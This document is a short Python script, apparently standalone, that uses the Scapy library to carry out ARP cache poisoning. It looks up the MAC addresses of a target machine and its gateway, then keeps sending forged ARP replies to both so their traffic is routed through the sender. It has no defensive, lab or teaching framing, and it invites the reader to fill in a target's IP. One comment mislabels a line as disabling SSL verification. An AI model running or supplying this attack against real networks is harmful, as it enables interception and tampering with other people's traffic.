from scapy.all import ARP, Ether, send, srp, conf
import time

# Disable Scapy's SSL verification
conf.verb = 0  # Disable verbose output

def arp_poison(target_ip, target_mac, spoof_ip):
    # Create ARP response packet
    arp_response = ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    ether = Ether(dst=target_mac) / arp_response

    # Send the packet
    send(ether)

def get_mac(ip):
    # Send ARP request to get MAC address
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    return ans[0][1].hwsrc if ans else None

def main(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if target_mac is None or gateway_mac is None:
        print("Could not find MAC addresses.")
        return

    print(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")

    try:
        while True:
            # Poison the target
            arp_poison(target_ip, target_mac, gateway_ip)
            # Poison the gateway
            arp_poison(gateway_ip, gateway_mac, target_ip)
            time.sleep(2)  # Send every 2 seconds
    except KeyboardInterrupt:
        print("ARP poisoning stopped.")

if __name__ == "__main__":
    target_ip = "192.168.1.10"  # Change to your target's IP
    gateway_ip = "192.168.1.1"  # Change to your gateway's IP
    main(target_ip, gateway_ip)
